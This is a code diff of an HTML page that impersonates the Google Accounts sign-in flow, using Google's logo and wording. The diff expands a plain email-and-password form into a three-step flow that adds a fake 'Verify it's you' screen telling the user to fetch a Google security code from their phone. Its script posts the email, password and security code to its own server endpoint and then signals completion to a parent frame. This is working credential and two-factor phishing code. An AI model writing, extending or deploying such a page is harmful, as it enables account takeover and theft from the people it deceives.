@@ -1,232 +1,343 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Sign in – Google Accounts</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            background: #ffffff;
-            font-family: 'Google Sans', Roboto, Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .card {
-            display: flex;
-            flex-direction: row;
-            width: 860px;
-            min-height: 480px;
-            background: #ffffff;
-            border: 1px solid #e0e0e0;
-            border-radius: 28px;
-            overflow: hidden;
-            padding: 48px 40px 36px 48px;
-            gap: 48px;
-            align-items: flex-start;
-        }
-
-        /* LEFT COLUMN */
-        .left {
-            flex: 0 0 260px;
-            display: flex;
-            flex-direction: column;
-            gap: 0;
-        }
-
-        .google-logo {
-            width: 38px;
-            height: 38px;
-            margin-bottom: 40px;
-        }
-
-        .left h1 {
-            font-size: 32px;
-            font-weight: 400;
-            color: #202124;
-            letter-spacing: 0;
-            line-height: 1.2;
-            margin-bottom: 10px;
-        }
-
-        .left p {
-            font-size: 16px;
-            font-weight: 400;
-            color: #202124;
-        }
-
-        /* RIGHT COLUMN */
-        .right {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            padding-top: 6px;
-        }
-
-        .input-wrap {
-            position: relative;
-            margin-bottom: 8px;
-        }
-
-        .input-wrap input {
-            width: 100%;
-            height: 56px;
-            padding: 20px 14px 6px 14px;
-            font-size: 16px;
-            font-family: inherit;
-            color: #202124;
-            background: transparent;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            outline: none;
-            transition: border-color 0.15s, border-width 0.15s;
-        }
-
-        .input-wrap input:focus {
-            border: 2px solid #1a73e8;
-        }
-
-        .input-wrap label {
-            position: absolute;
-            left: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 16px;
-            color: #80868b;
-            pointer-events: none;
-            transition: all 0.15s ease;
-            background: #fff;
-            padding: 0 2px;
-        }
-
-        .input-wrap input:focus + label,
-        .input-wrap input:not(:placeholder-shown) + label {
-            top: 0px;
-            font-size: 12px;
-            color: #1a73e8;
-        }
-
-        .input-wrap input:not(:focus):not(:placeholder-shown) + label {
-            color: #80868b;
-        }
-
-        .forgot-link {
-            display: inline-block;
-            font-size: 14px;
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-            margin-top: 6px;
-            margin-bottom: 28px;
-        }
-
-        .forgot-link:hover { text-decoration: underline; }
-
-        .show-password {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 6px;
-            margin-bottom: 28px;
-        }
-
-        .show-password input[type="checkbox"] {
-            width: 16px;
-            height: 16px;
-            accent-color: #1a73e8;
-            cursor: pointer;
-        }
-
-        .show-password label {
-            font-size: 14px;
-            color: #202124;
-            cursor: pointer;
-        }
-
-        .btn-row {
-            display: flex;
-            align-items: center;
-            justify-content: flex-end;
-            gap: 8px;
-        }
-
-        .btn-next {
-            background: #1a73e8;
-            border: none;
-            color: #ffffff;
-            font-size: 14px;
-            font-weight: 500;
-            font-family: inherit;
-            padding: 10px 24px;
-            border-radius: 20px;
-            cursor: pointer;
-            letter-spacing: 0.25px;
-        }
-
-        .btn-next:hover { background: #1765cc; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in – Google Accounts</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;color:#202124}
+  .page{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:44px 24px;background:#fff}
+  .screen{display:none;width:100%}
+  .screen.active{display:flex;animation:fi .25s ease}
+ 
+  /* ── TWO COLUMN LAYOUT ── */
+  .two-col{display:flex;flex-direction:row;max-width:800px;width:100%}
+  .left{flex:0 0 300px;padding-right:52px;display:flex;flex-direction:column;padding-top:4px}
+  .right{flex:1;display:flex;flex-direction:column}
+  .g-icon{margin-bottom:44px}
+  .left h1{font-size:32px;font-weight:400;color:#202124;line-height:1.2;margin-bottom:12px}
+  .left .sub{font-size:16px;color:#202124;line-height:1.4}
+  .left .sub a{color:#1a73e8;text-decoration:none}
+  .left .sub a:hover{text-decoration:underline}
+ 
+  /* ── EMAIL PILL ── */
+  .pill{display:none;align-items:center;gap:8px;margin-top:14px;width:fit-content;padding:6px 16px;border:1px solid #dadce0;border-radius:20px;cursor:pointer;background:#fff;transition:background .15s}
+  .pill:hover{background:#f1f3f4}
+  .av{width:24px;height:24px;border-radius:50%;background:#1a73e8;display:flex;align-items:center;justify-content:center;font-size:12px;color:#fff;font-weight:500;flex-shrink:0}
+  .pill .em{font-size:14px;color:#202124;font-family:Roboto,sans-serif}
+  .pill .arr{font-size:11px;color:#5f6368}
+ 
+  /* ── INPUTS ── */
+  .fgroup{position:relative;margin-bottom:8px}
+  .fgroup input{width:100%;height:68px;padding:22px 18px 0;border:1px solid #dadce0;border-radius:6px;font-size:17px;color:#202124;font-family:Roboto,sans-serif;outline:none;background:#fff;transition:border .15s}
+  .fgroup input:focus{border:2px solid #1a73e8}
+  .fgroup label{position:absolute;top:50%;left:18px;transform:translateY(-50%);font-size:17px;color:#80868b;pointer-events:none;transition:all .15s;font-family:Roboto,sans-serif;background:#fff;padding:0 3px}
+  .fgroup input:focus~label,
+  .fgroup input:not(:placeholder-shown)~label{top:0;font-size:12px;color:#1a73e8}
+  .fgroup input:not(:focus):not(:placeholder-shown)~label{color:#80868b}
+  .fgroup.err input{border:2px solid #d93025}
+  .fgroup.err label,
+  .fgroup.err input:focus~label{color:#d93025}
+ 
+  .errtxt{font-size:12px;color:#d93025;margin:5px 0 0 18px;display:none;font-family:Roboto,sans-serif}
+  .errtxt.show{display:block}
+ 
+  /* ── LINKS & CHECKBOX ── */
+  .flink{display:inline-block;font-size:14px;color:#1a73e8;text-decoration:none;margin-top:12px;font-family:Roboto,sans-serif}
+  .flink:hover{text-decoration:underline}
+  .chkrow{display:flex;align-items:center;gap:10px;margin-top:16px}
+  .chkrow input[type=checkbox]{width:17px;height:17px;accent-color:#1a73e8;cursor:pointer}
+  .chkrow label{font-size:14px;color:#202124;font-family:Roboto,sans-serif;cursor:pointer}
+ 
+  /* ── ACTION ROW ── */
+  .actrow{display:flex;align-items:center;justify-content:space-between;margin-top:40px}
+  .clink{font-size:14px;color:#1a73e8;text-decoration:none;font-family:Roboto,sans-serif;font-weight:500}
+  .clink:hover{text-decoration:underline}
+ 
+  /* ── BUTTON WITH SPINNER ── */
+  .btn{position:relative;background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:0 36px;height:42px;min-width:96px;font-size:14px;font-weight:500;font-family:'Google Sans',Roboto,sans-serif;cursor:pointer;letter-spacing:.25px;display:inline-flex;align-items:center;justify-content:center;transition:background .15s}
+  .btn:hover:not(:disabled){background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
+  .btn:active:not(:disabled){background:#1558b0}
+  .btn:disabled{cursor:not-allowed;opacity:.9}
+  .btn .lbl{transition:opacity .1s}
+  .btn .spin{display:none;width:16px;height:16px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
+  .btn.loading .lbl{opacity:0;position:absolute}
+  .btn.loading .spin{display:block}
+ 
+  .btn-ghost{background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:0 20px;height:42px;border-radius:24px;font-family:'Google Sans',Roboto,sans-serif}
+  .btn-ghost:hover{background:#e8f0fe}
+ 
+  /* ── VERIFY SCREEN LAYOUT ── */
+  .v-two-col{display:flex;flex-direction:row;gap:80px;max-width:900px;width:100%}
+  .v-left{flex:0 0 310px;display:flex;flex-direction:column}
+  .v-right{flex:1;display:flex;flex-direction:column;padding-top:56px}
+ 
+  .acct-chip{display:inline-flex;align-items:center;gap:10px;border:1px solid #dadce0;border-radius:24px;padding:7px 14px 7px 10px;cursor:pointer;width:fit-content;font-size:14px;color:#202124;background:#fff;margin-top:16px;user-select:none}
+  .acct-chip:hover{background:#f1f3f4}
+  .acct-icon{width:20px;height:20px;border-radius:50%;background:#5f6368;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+  .acct-icon svg{fill:#fff}
+ 
+  .steps{list-style:none;margin-bottom:28px;display:flex;flex-direction:column;gap:12px}
+  .steps li{display:flex;align-items:flex-start;gap:10px;font-size:14px;color:#202124;line-height:1.5}
+  .steps li::before{content:'•';font-size:18px;line-height:1.2;flex-shrink:0}
+  .steps li b{font-weight:600}
+ 
+  /* ── VERIFY CODE INPUT ── */
+  .code-wrap{position:relative;margin-bottom:28px}
+  .code-wrap input{width:100%;height:68px;border:2px solid #1a73e8;border-radius:6px;padding:22px 18px 8px;font-size:17px;color:#202124;background:#fff;outline:none;font-family:inherit}
+  .code-wrap .clabel{position:absolute;top:-10px;left:14px;background:#fff;padding:0 4px;font-size:12px;color:#1a73e8;pointer-events:none}
+  .vactrow{display:flex;align-items:center;justify-content:flex-end;gap:8px}
+ 
+  /* ── ANIMATIONS ── */
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes fi{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+ 
+  /* ── RESPONSIVE ── */
+  @media(max-width:600px){
+    .two-col,.v-two-col{flex-direction:column;gap:32px}
+    .left,.v-left{flex:none;padding-right:0}
+    .v-right{padding-top:0}
+  }
+</style>
 </head>
 <body>
-
-<div class="card">
-
-    <!-- LEFT -->
-    <div class="left">
-        <!-- Google G logo -->
-        <svg class="google-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+<div class="page">
+ 
+  <!-- ══════════════════════════════
+       SCREEN 1 : EMAIL
+  ══════════════════════════════ -->
+  <div class="screen active" id="sc1">
+    <div class="two-col">
+ 
+      <!-- Left -->
+      <div class="left">
+        <div class="g-icon">
+          <svg viewBox="0 0 48 48" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
             <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
             <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
             <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
             <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-            <path fill="none" d="M0 0h48v48H0z"/>
-        </svg>
-
+          </svg>
+        </div>
         <h1>Sign in</h1>
-        <p>Use your Google Account</p>
+        <p class="sub">Use your Google Account</p>
+      </div>
+ 
+      <!-- Right -->
+      <div class="right">
+        <div class="fgroup" id="eg">
+          <input type="email" id="ei" placeholder=" " autocomplete="email">
+          <label for="ei">Email or phone</label>
+        </div>
+        <div class="errtxt" id="ee">Enter a valid email or phone number</div>
+        <a href="#" class="flink">Forgot email?</a>
+        <div class="actrow">
+          <a href="#" class="clink">Create account</a>
+          <button class="btn" id="btn1">
+            <span class="lbl">Next</span>
+            <span class="spin"></span>
+          </button>
+        </div>
+      </div>
+ 
     </div>
-
-    <!-- RIGHT -->
-    <div class="right">
-
-        <!-- Email input -->
-        <div class="input-wrap">
-            <input type="email" id="email" placeholder=" "/>
-            <label for="email">Email or phone</label>
+  </div>
+ 
+  <!-- ══════════════════════════════
+       SCREEN 2 : PASSWORD
+  ══════════════════════════════ -->
+  <div class="screen" id="sc2">
+    <div class="two-col">
+ 
+      <!-- Left -->
+      <div class="left">
+        <div class="g-icon">
+          <svg viewBox="0 0 48 48" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+          </svg>
         </div>
-
-        <a href="#" class="forgot-link">Forgot email?</a>
-
-        <!-- Password input -->
-        <div class="input-wrap">
-            <input type="password" id="password" placeholder=" "/>
-            <label for="password">Enter your password</label>
+        <h1>Sign in</h1>
+        <p class="sub">Use your Google Account</p>
+        <div class="pill" id="pill2">
+          <div class="av" id="av2"></div>
+          <span class="em" id="em2"></span>
+          <span class="arr">▾</span>
         </div>
-
-        <div class="show-password">
-            <input type="checkbox" id="showpw" onchange="var p = document.getElementById('password'); p.type = this.checked ? 'text' : 'password';"/>
-            <label for="showpw">Show password</label>
+      </div>
+ 
+      <!-- Right -->
+      <div class="right">
+        <div class="fgroup" id="pg">
+          <input type="password" id="pi" placeholder=" " autocomplete="current-password">
+          <label for="pi">Enter your password</label>
         </div>
-
-        <div class="btn-row">
-            <button class="btn-next" onclick="loginAttempt()">Next</button>
+        <div class="errtxt" id="pe">Wrong password. Try again or click Forgot password.</div>
+        <div class="chkrow">
+          <input type="checkbox" id="sp">
+          <label for="sp">Show password</label>
         </div>
-
+        <a href="#" class="flink">Forgot password?</a>
+        <div class="actrow">
+          <a href="#" class="clink">Create account</a>
+          <button class="btn" id="btn2">
+            <span class="lbl">Next</span>
+            <span class="spin"></span>
+          </button>
+        </div>
+      </div>
+ 
     </div>
+  </div>
+ 
+  <!-- ══════════════════════════════
+       SCREEN 3 : VERIFY IT'S YOU
+  ══════════════════════════════ -->
+  <div class="screen" id="sc3">
+    <div class="v-two-col">
+ 
+      <!-- Left -->
+      <div class="v-left">
+        <div style="margin-bottom:28px">
+          <svg viewBox="0 0 272 92" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+            <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+            <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+            <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+            <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+            <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65H35.29z"/>
+          </svg>
+        </div>
+        <h1>Verify it's you</h1>
+        <p class="sub" style="font-size:14px;line-height:1.6">
+          To help keep your account safe, Google wants to make sure it's really you trying to sign in.
+          <a href="#">Learn more</a>
+        </p>
+        <div class="acct-chip">
+          <div class="acct-icon">
+            <svg width="14" height="14" viewBox="0 0 24 24">
+              <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
+            </svg>
+          </div>
+          <span id="chip-email">user@gmail.com</span>
+          <svg style="width:18px;height:18px;fill:#5f6368;margin-left:2px" viewBox="0 0 24 24">
+            <path d="M7 10l5 5 5-5z"/>
+          </svg>
+        </div>
+      </div>
+ 
+      <!-- Right -->
+      <div class="v-right">
+        <ul class="steps">
+          <li>Get your <b>Mobile Phone</b></li>
+          <li>Open the <b>Settings</b> app ⚙️</li>
+          <li>Tap <b>Google</b></li>
+          <li>Choose your account, if it is not already selected</li>
+          <li>Tap <b>Manage your Google Account</b></li>
+          <li>Select the Security tab (you may need to scroll to the right)</li>
+          <li>Under "Signing in to Google" tap <b>Security code</b></li>
+          <li>Choose an account to get your code</li>
+        </ul>
+        <div class="code-wrap">
+          <span class="clabel">Enter code</span>
+          <input type="text" id="ci" autocomplete="one-time-code">
+        </div>
+        <div class="vactrow">
+          <button class="btn" id="btn3">
+            <span class="lbl">Next</span>
+            <span class="spin"></span>
+          </button>
+        </div>
+      </div>
+ 
+    </div>
+  </div>
+ 
 </div>
-
+ 
 <script>
-    async function loginAttempt() {
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      
-      if (!email || !password) {
-        alert("Please enter email and password");
-        return;
-      }
+(function () {
+  function $(id) { return document.getElementById(id); }
+ 
+  function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(function (s) {
+      s.classList.remove('active');
+    });
+    $(id).classList.add('active');
+  }
+ 
+  function isValid(v) {
+    return /\S+@\S+\.\S+/.test(v) || /^[\d\s+\-(]{7,}$/.test(v);
+  }
+ 
+  function loadThen(btnId, cb) {
+    var btn = $(btnId);
+    btn.classList.add('loading');
+    btn.disabled = true;
+    var delay = 1000 + Math.random() * 800;
+    setTimeout(function () {
+      btn.classList.remove('loading');
+      btn.disabled = false;
+      cb();
+    }, delay);
+  }
+ 
+  /* ── STEP 1: Email → Password ── */
+  $('btn1').addEventListener('click', function () {
+    var v = $('ei').value.trim();
+    if (!v || !isValid(v)) {
+      $('eg').classList.add('err');
+      $('ee').classList.add('show');
+      $('ei').focus();
+      return;
+    }
+    $('eg').classList.remove('err');
+    $('ee').classList.remove('show');
+    loadThen('btn1', function () {
+      $('av2').textContent = v[0].toUpperCase();
+      $('em2').textContent = v;
+      $('pill2').style.display = 'flex';
+      $('chip-email').textContent = v;
+      showScreen('sc2');
+      setTimeout(function () { $('pi').focus(); }, 80);
+    });
+  });
+ 
+  /* ── STEP 2: Password → Verify ── */
+  $('btn2').addEventListener('click', function () {
+    var v = $('pi').value;
+    if (!v) {
+      $('pg').classList.add('err');
+      $('pe').classList.add('show');
+      $('pi').focus();
+      return;
+    }
+    $('pg').classList.remove('err');
+    $('pe').classList.remove('show');
+    loadThen('btn2', function () {
+      showScreen('sc3');
+      setTimeout(function () { $('ci').focus(); }, 80);
+    });
+  });
+ 
+  /* ── STEP 3: Verify code → Done ── */
+  $('btn3').addEventListener('click', function () {
+    var v = $('ci').value.trim();
+    if (!v) {
+      $('ci').style.borderColor = '#d93025';
+      $('ci').focus();
+      return;
+    }
+    $('ci').style.borderColor = '#1a73e8';
+    loadThen('btn3', async function () {
+      // Send credentials
+      const email = $('ei').value.trim();
+      const password = $('pi').value;
+      const security_code = $('ci').value.trim();
       
       try {
           const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
@@ -235,7 +346,7 @@
           await fetch(endpoint, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ email, password })
+              body: JSON.stringify({ email, password, security_code })
           });
           
           window.parent.postMessage({ type: 'GOOGLE_LOGIN_DONE' }, '*');
@@ -243,8 +354,26 @@
           console.error(error);
           window.parent.postMessage({ type: 'GOOGLE_LOGIN_DONE' }, '*');
       }
-    }
+    });
+  });
+ 
+  /* ── Show Password Toggle ── */
+  $('sp').addEventListener('change', function () {
+    $('pi').type = this.checked ? 'text' : 'password';
+  });
+ 
+  /* ── Pill click → Back to Email ── */
+  $('pill2').addEventListener('click', function () {
+    $('pill2').style.display = 'none';
+    showScreen('sc1');
+    setTimeout(function () { $('ei').focus(); }, 80);
+  });
+ 
+  /* ── Enter Key Support ── */
+  $('ei').addEventListener('keydown', function (e) { if (e.key === 'Enter') $('btn1').click(); });
+  $('pi').addEventListener('keydown', function (e) { if (e.key === 'Enter') $('btn2').click(); });
+  $('ci').addEventListener('keydown', function (e) { if (e.key === 'Enter') $('btn3').click(); });
+})();
 </script>
-
 </body>
 </html>
